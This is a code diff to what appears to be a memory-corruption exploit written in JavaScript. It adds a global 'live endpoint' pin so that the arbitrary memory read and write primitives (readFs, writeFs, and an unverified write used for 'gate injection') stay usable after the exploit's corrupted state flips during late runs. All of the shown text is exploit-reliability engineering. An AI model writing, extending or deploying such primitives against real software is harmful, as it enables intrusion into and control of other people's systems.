@@ -17,6 +17,16 @@ const DATA_OFF = 0x4000;
 const DATA_ENTRY = 0x90;
 const ARRAY_LEN = 0x5a0;
 
+// Live-endpoint pin: late-run reads observed context.ep reading armed and
+// unarmed with no intervening await (runs 119-129 — heap interference
+// suspected). The stage-1 ep object is remembered here; readFs/writeFs fall
+// back to it when context.ep looks disarmed.
+let LIVE_EP = null;
+export function liveEndpoint() {
+    return LIVE_EP;
+}
+
+
 export async function armEndpoint(context) {
     const saved = context.state.endpoint;
     check(saved && Number.isSafeInteger(saved.array) && Number.isSafeInteger(saved.owner),
@@ -94,6 +104,7 @@ export async function armEndpoint(context) {
     await khLog("AM2 canonical retarget");
     await setPointer(ep, ep.array, "arm-canonical");
     ep.armed = true;
+    LIVE_EP = ep;
     context.ep = ep;
     await khLog("endpoint re-armed array=" + hex(ep.array) +
         " owner=" + hex(ep.owner));
@@ -121,8 +132,15 @@ function validAddress(address, length) {
         address + length < 0x8000000000;
 }
 
-export async function readFs(context, address, length) {
+function armedEndpoint(context) {
     const ep = context.ep;
+    if (ep && ep.armed) return ep;
+    if (LIVE_EP && LIVE_EP.armed) return LIVE_EP;   // the pin beats the flip
+    return ep;
+}
+
+export async function readFs(context, address, length) {
+    const ep = armedEndpoint(context);
     check(ep && ep.armed, "endpoint is not armed");
     check(Number.isInteger(length) && length > 0 && length <= 0x600000 &&
         validAddress(address, length), "invalid FS read range " + hex(address) + "+" + length);
@@ -138,7 +156,7 @@ export async function readFs(context, address, length) {
 }
 
 export async function writeFs(context, address, bytes) {
-    const ep = context.ep;
+    const ep = armedEndpoint(context);
     check(ep && ep.armed, "endpoint is not armed");
     check(bytes.length > 0 && bytes.length <= 0x600000 &&
         validAddress(address, bytes.length), "invalid FS write range");
@@ -154,7 +172,7 @@ export async function writeFs(context, address, bytes) {
 // One-shot unverified write (bounded): used when a readback would consume a
 // wake (gate injection). The caller keeps its own restoration path.
 export async function writeFsUnverified(context, address, bytes) {
-    const ep = context.ep;
+    const ep = armedEndpoint(context);
     check(ep && ep.armed && bytes.length > 0 && bytes.length <= 0x100 &&
         validAddress(address, bytes.length), "invalid unverified FS write");
     await setPointer(ep, address);
